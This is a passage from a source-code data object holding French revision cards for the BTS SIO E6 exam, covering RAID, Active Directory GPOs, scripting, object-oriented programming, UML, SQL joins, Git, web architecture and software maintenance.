"e6s-raid": ["RAID 0 : vitesse, pas de sécurité. RAID 1 : miroir, un disque peut tomber. RAID 5 : parité répartie, un disque peut tomber, bon compromis. RAID 10 : miroirs agrégés, rapide et tolérant.", "4 disques de 2 To en RAID 5 = 6 To utiles ; en RAID 10 = 4 To utiles.", "Le RAID protège d'une panne de disque, PAS d'une suppression ou d'un rançongiciel : ce n'est pas une sauvegarde."],
"e6s-annuaire": ["Active Directory centralise les comptes, les groupes et les machines ; les GPO appliquent automatiquement des réglages à des utilisateurs ou ordinateurs selon leur unité d'organisation.", "Une GPO sur l'OU Comptabilité connecte le lecteur réseau P: et interdit les clés USB.", "Une GPO s'applique à une OU (pas directement à un groupe, sauf filtrage de sécurité). Ordre : local, site, domaine, OU (la plus proche gagne)."],
"e6s-scripts": ["Automatiser, c'est écrire une fois ce qu'on ferait à la main cent fois : moins d'erreurs, plus de rapidité, et des opérations reproductibles et documentées.", "Script PowerShell qui crée 50 comptes AD depuis un fichier CSV ; script Bash lancé par cron qui sauvegarde /var/www chaque nuit.", "Teste toujours un script sur un petit échantillon avant de le lancer en production."],
/* ───── E6 SLAM ───── */
"e6d-epreuve": ["L'E6 SLAM est une épreuve pratique et orale (40 minutes) basée sur deux réalisations. Le jury peut te demander de modifier ton code en direct ou d'expliquer un choix technique.", "« Ajoutez un champ téléphone au formulaire client, avec la colonne en base et la validation. »", "Révise ton propre code : le jury choisit souvent un morceau précis et demande « que fait cette ligne ? »."],
"e6d-poo": ["Encapsulation : on protège les données de l'objet (privé + accesseurs). Héritage : une classe reprend une autre et la spécialise. Polymorphisme : une même méthode se comporte différemment selon l'objet.", "Classe Vehicule → Voiture et Moto héritent ; chacune redéfinit calculerTaxe() à sa façon.", "Un attribut public casse l'encapsulation : le jury le remarque."],
"e6d-uml": ["Cas d'utilisation : ce que les utilisateurs font avec l'application. Classes : la structure du code. Séquence : l'ordre des échanges entre objets pour un scénario.", "Diagramme de séquence « Se connecter » : Utilisateur → Contrôleur → Modèle → base de données → retour.", "Un acteur est extérieur au système : la base de données n'est pas un acteur."],
"e6d-norm": ["Chaque entité devient une table, son identifiant devient clé primaire. Une association 1-n donne une clé étrangère côté « n ». Une association n-n donne une nouvelle table.", "Client 1-n Commande → Commande(idCommande, date, #idClient).", "La clé étrangère va du côté où il y a « plusieurs », pas l'inverse."],
"e6d-jointure": ["INNER JOIN garde seulement les lignes qui ont une correspondance des deux côtés ; LEFT JOIN garde toutes les lignes de la table de gauche, même sans correspondance (NULL à droite).", "Lister TOUS les clients avec leurs commandes, même ceux qui n'ont rien commandé → LEFT JOIN.", "Pour trouver les clients SANS commande : LEFT JOIN … WHERE commande.id IS NULL."],
"e6d-git": ["Git garde l'historique de ton code. On fait des commits réguliers avec des messages clairs, on travaille sur des branches, puis on fusionne.", "git checkout -b ajout-formulaire ; git add . ; git commit -m \"Ajoute le formulaire client\" ; git push.", "Un message comme « modif » ne sert à rien : décris ce que fait le commit."],
"e6d-archi": ["Le navigateur (client) envoie des requêtes HTTP au serveur ; le serveur applicatif (souvent en MVC) traite la demande et interroge la base de données ; la réponse revient au client.", "Navigateur → Apache/PHP (contrôleur, modèle) → MySQL → page HTML renvoyée.", "Sache dire où s'exécute chaque partie du code : le JavaScript du navigateur n'est pas sur le serveur."],
"e6d-qualite": ["Maintenir une application, c'est la corriger (corrective), l'améliorer (évolutive), l'adapter à un nouvel environnement (adaptative). La qualité passe par les tests, la documentation, des conventions de code.", "Corriger un bogue de calcul de TVA = corrective ; ajouter un export PDF = évolutive ; passer à PHP 8.3 = adaptative.", "Documente aussi pour les autres : commentaires utiles, README, documentation technique."]
};
